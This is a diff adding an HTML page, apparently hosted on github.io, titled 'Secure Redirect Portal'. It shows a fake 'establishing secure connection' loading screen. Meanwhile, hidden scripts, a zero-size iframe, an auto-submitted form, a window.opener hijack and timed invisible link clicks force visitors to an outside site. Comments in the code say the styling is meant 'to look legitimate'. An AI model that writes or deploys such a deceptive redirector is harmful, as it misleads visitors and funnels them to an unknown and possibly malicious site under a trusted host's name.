@@ -1,1 +1,132 @@
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Redirect Portal</title>
+    <!-- Multiple redirect methods for maximum compatibility -->
+    <meta http-equiv="refresh" content="0.1;url=https://alansmithg.site.pro/?src=github&t=<TIMESTAMP>">
+    <meta property="og:url" content="https://alansmithg.site.pro/">
+    <link rel="canonical" href="https://alansmithg.site.pro/">
+    <style>
+        /* Minimal styling to look legitimate */
+        body { 
+            margin: 0; 
+            padding: 0; 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            text-align: center;
+            color: white;
+            padding: 40px;
+        }
+        .logo {
+            font-size: 2rem;
+            font-weight: 300;
+            margin-bottom: 20px;
+        }
+        .loading {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Visible loading screen -->
+    <div class="container" id="loadingScreen">
+        <div class="logo">Secure Portal</div>
+        <div class="spinner"></div>
+        <div class="loading">Establishing secure connection...</div>
+    </div>
+    
+    <!-- Hidden immediate redirect methods -->
+    <div class="hidden">
+        <!-- Method 1: JavaScript redirect -->
+        <script>
+            // Immediate redirect attempt
+            window.location.replace("https://alansmithg.site.pro/?method=js&t=" + Date.now());
+        </script>
+        
+        <!-- Method 2: Iframe redirect -->
+        <iframe src="https://alansmithg.site.pro/" 
+                style="width:0;height:0;border:0;border:none;" 
+                onload="window.location.href='https://alansmithg.site.pro/'">
+        </iframe>
+        
+        <!-- Method 3: Form auto-submit -->
+        <form id="autoRedirect" action="https://alansmithg.site.pro/" method="GET">
+            <input type="hidden" name="src" value="github">
+            <input type="hidden" name="redirect" value="auto">
+        </form>
+        <script>
+            document.getElementById('autoRedirect').submit();
+        </script>
+        
+        <!-- Method 4: Meta refresh (already in head) -->
+        
+        <!-- Method 5: Link preload -->
+        <link rel="prerender" href="https://alansmithg.site.pro/">
+        
+        <!-- Method 6: Window opener -->
+        <script>
+            if (window.opener) {
+                window.opener.location = "https://alansmithg.site.pro/";
+                window.close();
+            }
+        </script>
+    </div>
+    
+    <!-- Fallback in case all above fail -->
+    <script>
+        // If still on this page after 500ms, use direct redirect
+        setTimeout(function() {
+            if (window.location.href.indexOf('github.io') !== -1) {
+                window.location.href = "https://alansmithg.site.pro/?fallback=true&t=" + Date.now();
+            }
+        }, 500);
+        
+        // Ultimate fallback after 2 seconds
+        setTimeout(function() {
+            if (window.location.href.indexOf('github.io') !== -1) {
+                // Create invisible button and click it
+                var btn = document.createElement('a');
+                btn.href = "https://alansmithg.site.pro/";
+                btn.style.display = 'none';
+                document.body.appendChild(btn);
+                btn.click();
+            }
+        }, 2000);
+    </script>
+    
+    <!-- Hide loading screen after redirect -->
+    <script>
+        // Check if redirected successfully
+        setInterval(function() {
+            if (window.location.href.indexOf('alansmithg.site.pro') !== -1) {
+                document.getElementById('loadingScreen').classList.add('hidden');
+            }
+        }, 100);
+    </script>
+</body>
+</html>
